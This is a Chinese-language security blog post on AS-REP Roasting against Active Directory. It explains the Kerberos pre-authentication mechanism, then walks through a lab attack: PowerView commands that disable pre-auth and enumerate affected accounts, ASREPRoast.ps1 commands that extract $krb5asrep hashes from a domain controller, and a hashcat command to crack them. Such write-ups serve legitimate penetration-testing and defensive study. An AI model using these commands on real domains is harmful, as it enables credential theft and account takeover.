---
title: AS-REP Roasting
date: 2020-12-31 23:59:54 +0800
categories: [域安全, TA0006凭据访问]
tags: [AS-REP Roasting, TA0006凭据访问]     # TAG names should always be lowercase
typora-root-url: ..
---



## 0x00 简介

如果账户设置了`Do not require Kerberos preauthentication`，则在AS-REQ阶段就不需要用Client Master Key加密timestamp，用于KDC验证自身。因此，攻击者可以伪装成任意用户发出AS-REQ，而AES-REP中的Session Key是由Client Master Key加密的；一旦攻击者拿到AES-REP后便可暴力破解，如果能顺利解密说明破解成功。

![image-20201229101454378](/assets/img/image-20201229101454378.png)



**参考：**

[Roasting AS-REPs](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)

[域渗透——AS-REPRoasting](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AS-REPRoasting/)

[A Generalized Framework for Kerberos Pre-Authentication](https://tools.ietf.org/html/rfc6113#section-2.2)



## 0x01 AS-REP Roasting原理

Kerberos preauthentication的作用：

> https://ldapwiki.com/wiki/Kerberos%20Pre-Authentication
>
> Kerberos Pre-Authentication is a concept within [Kerberos](https://ldapwiki.com/wiki/Kerberos).
>
> Kerberos Pre-Authentication is defined in [RFC 6113](https://ldapwiki.com/wiki/RFC 6113) and an [IANA Registry](https://ldapwiki.com/wiki/IANA Registry) for [Pre-authentication and Typed Data](https://www.iana.org/assignments/kerberos-parameters/kerberos-parameters.xhtml#pre-authentication)
>
> Kerberos Pre-Authentication is a security feature which offers protection against [password-guessing](https://ldapwiki.com/wiki/Brute-Force) [attacks](https://ldapwiki.com/wiki/Attack). The AS request identifies the client to the [KDC](https://ldapwiki.com/wiki/KDC) in [Plaintext](https://ldapwiki.com/wiki/Plaintext). If Kerberos Pre-Authentication is enabled, a [Timestamp](https://ldapwiki.com/wiki/Timestamp) will be [encrypted](https://ldapwiki.com/wiki/Encrypted) using the user's [password](https://ldapwiki.com/wiki/Password) [hash](https://ldapwiki.com/wiki/Hash) as an [encryption](https://ldapwiki.com/wiki/Encryption) [key](https://ldapwiki.com/wiki/Key). If the [KDC](https://ldapwiki.com/wiki/KDC) reads a valid time when using the user's password hash, which is available in the [Microsoft Active Directory](https://ldapwiki.com/wiki/Microsoft Active Directory), to decrypt the [Timestamp](https://ldapwiki.com/wiki/Timestamp), the [KDC](https://ldapwiki.com/wiki/KDC) knows that request isn't a replay of a previous request.
>
> Without Kerberos Pre-Authentication a [malicious](https://ldapwiki.com/wiki/Malicious) [attacker](https://ldapwiki.com/wiki/Attacker) can directly send a dummy request for [authentication](https://ldapwiki.com/wiki/Authentication). The [KDC](https://ldapwiki.com/wiki/KDC) will return an [encrypted](https://ldapwiki.com/wiki/Encrypted) [TGT](https://ldapwiki.com/wiki/TGT) and the [attacker](https://ldapwiki.com/wiki/Attacker) can brute force it offline. Upon checking the [KDC](https://ldapwiki.com/wiki/KDC) logs, nothing will be seen except a single request for a [TGT](https://ldapwiki.com/wiki/TGT). When [Kerberos](https://ldapwiki.com/wiki/Kerberos) [timestamp](https://ldapwiki.com/wiki/Timestamp) Kerberos Pre-Authentication is enforced, the [attacker](https://ldapwiki.com/wiki/Attacker) cannot directly ask the [KDCs](https://ldapwiki.com/wiki/KDC) for the encrypted material to [Brute-Force](https://ldapwiki.com/wiki/Brute-Force) offline.



注意抓包前先用**KERBEROS::Purge** 清理所有Kerberos ticket，首先看一个带Pre-Authentication的流量，在第二个AS-REQ里，Client会发送密码Hash加密过的timestamp, KDC如果解密成功，即可验证Client。

 [ASExchange_WithPreau.pcapng](https://github.com/RingLcy/BlogStorage/tree/main/traffic/ASExchange_WithPreau.pcapng) 

![image-20201229095230284](/assets/img/image-20201229095230284.png)



再看一个不带Pre-Authentication的流量，可以发现AS-REQ中没有entrypted timestamp字段，即不需要让KDC验证身份。

 [ASExchange_WithoutPreau.pcapng](https://github.com/RingLcy/BlogStorage/tree/main/traffic/ASExchange_WithoutPreau.pcapng) 

![image-20201229095616210](/assets/img/image-20201229095616210.png)



对于关闭了Pre-Authentication的账户，攻击者可以在AS-REQ里仿冒成这些账户获取AS-REP，但还存在两个要解决的问题。

1. AS-REQ、AS-REP中都用指定的etype来加密数据，etype默认是AES256-CTS-HMAC-SHA1-96算法，该算法不如ARCFOUR-HMAC-MD5/RC4快。为了后面暴力破解更快，需要在AS-REQ时就直接指定etype。
2. 传输数据采用了ASN.1格式，.Net没有内置ASN.1的格式解析，最终作者使用的是[open source C# version](https://github.com/bcgit/bc-csharp) 



最终AS-REP Roasting流量如下：

 [AS-REPRoasting.pcapng](https://github.com/RingLcy/BlogStorage/tree/main/traffic/AS-REPRoasting.pcapng) 

![image-20201229100542623](/assets/img/image-20201229100542623.png)





## 0x02 AS-REP Roasting利用

### [1. ASREPRoast.ps1](https://github.com/HarmJ0y/ASREPRoast/blob/master/ASREPRoast.ps1)



#### 设置账户不需要Pre-Auth(需要Domain Admins权限)

```
// Powerview, 事后也是执行同样的命令Enable Pre-Auth
PS C:\Users\Administrator\Desktop> Set-DomainObject -Identity win10_2 -XOR @{userAccountControl=4194304} -Verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://RINGDC-PC.RING2.COM/DC=RING2,DC=COM
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=win10_2)(name=win10_2)(displayname=win10_2))))
VERBOSE: [Set-DomainObject] XORing 'userAccountControl' with '4194304' for object 'win10_2'
```





#### 查找不需要`Pre-Auth`的账户

```
// LDAP Filter
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

// Powerview, Get-DomainUser -PreauthNotRequired
PS C:\Users\win10\Desktop> Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://RINGDC-PC.RING2.COM/DC=RING2,DC=COM
VERBOSE: [Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate
VERBOSE: [Get-DomainUser] filter string:
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

distinguishedname
-----------------
CN=win10_2,CN=Users,DC=ring2,DC=com
```



#### 发送自己构造的AS-REQ

```
// ASREPRoast.ps1
PS C:\Users\win10\Desktop> Get-ASREPHash -UserName win10_2 -Domain ring2.com -Verbose
VERBOSE: [Get-ASREPHash] DC server IP '192.168.240.142' resolved from passed -Domain parameter
VERBOSE: [Get-ASREPHash] Bytes sent to '192.168.240.142': 157
VERBOSE: [Get-ASREPHash] Bytes received from '192.168.240.142': 1356
$krb5asrep$win10_2@ring2.com:5f799d1ea6514c063501cf007e57413b$f9fd3ed74412ebd698ba4a6a158109da42eed6ae7bf2318160f7de6aaa9e9f60cbf45a98c781671a68483e0ba3fb44395b7248fbb53cb89871b357f81544b8b5a4097057507c5a8a48ee3ec9716fc6b6292bc683dc953b6b19e17d6d8f386998c0c78f543d665363ed12b36ee38b0107d21f49f49460dce935bed6005284cb2dc187008fb0f0233163ad4ae61b2a7caf977cdf4c9ebaee05591bfe90c5f4f56b4ef12d17200396469318810cf5c0c1976d316ada73e54a3eff8d0da01ac9cc4dac64d5c082f9cc521a090163a2c271072d2b78b998f9cc2f47f84bfd4d2d06f20f4a6bd61eb2
```



`Invoke-ASREPRoast`将发现和发送组合到了一起，可以直接调用。

```
PS C:\Users\win10\Desktop> Invoke-ASREPRoast -Verbose |Format-List
VERBOSE: [Invoke-ASREPRoast] DC server IP '192.168.240.142' resolved from passed -Domain parameter
VERBOSE: [Get-DomainSearcher] search string: LDAP://ringdc-pc.ring2.com/DC=ring2,DC=com
VERBOSE: [Invoke-ASREPRoast] LDAP filter:
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
VERBOSE: [Get-ASREPHash] DC server IP '192.168.240.142' resolved from passed -Server parameter
VERBOSE: [Get-ASREPHash] Bytes sent to '192.168.240.142': 157
VERBOSE: [Get-ASREPHash] Bytes received from '192.168.240.142': 1356


SamaccountName    : win10_2
DistinguishedName : CN=win10_2,CN=Users,DC=ring2,DC=com
Hash              : $krb5asrep$win10_2@ring2.com:f11aab49f586f1fcab53dcc60dbe8e0e$6b1622e1a82818fa83fc69aa96fee761d7efe
                    07474f76748336b1cd7ddb6fb3781763037b3bd61f2fb24f8410fceb256f093fdd4e46fa95b1a09a2bcf139329ecd5ce1e8
                    aeb8b119e7a80f1a6bbb875593a26a01dcdb83939b8a241d7380918a63bbf58fe0c4ab94d5c8c7dc6a0c173e65b3eadc672
                    c7094728c3ff6cafae1f5e10286d0a9afd9ae42fd38c87a4c1e0f21ca91d1f786ea98af39b07045c690785e127594d52615
                    93b5780563ae614bed15d9cc70eb127ec682ab072414a59e112fd415baad8e0bf0495673543924ff2ae99b903f37f2f49b5
                    0f02cff77592222a12bae5fdc38
```



#### 暴力破解

需要在$krb5asrep加上etype类型$23

```
hashcat -m 18200 '$krb5asrep$23$win10_2@ring2.com:9b93f475d1348bc80d8826e558f94e39$d335c24cb5343d505cd0fd59cadf290c3a2af20dbdad28f8671dd6d82ba760e2de0cc29b0b6bc222bd1833b5d6d8bb6c2b1d3b5203ecadc6d305a5597949d4d60ac9a286c214af6be85596a7054b3a50664d489ef3fe72c397bb67fcc90225acb10637357c1408752b5e10d492a752bf0dbd18ed09f0b19962186a49ab98d30935983cbc20133597bdca32c8a1a71e60b098cc47a511f5f1d6c309205b0f76cfce6a3167b1481b2ec868bf48bb99ec23b42b942867cd0952833eb71f733d305ab9f50cb88d76eafd95619a75977c7bcb52bb31e0331239c2faee1dfb0da84d902d882d9a642b' password.txt --force
```

![image-20201229102020908](/assets/img/image-20201229102020908.png)

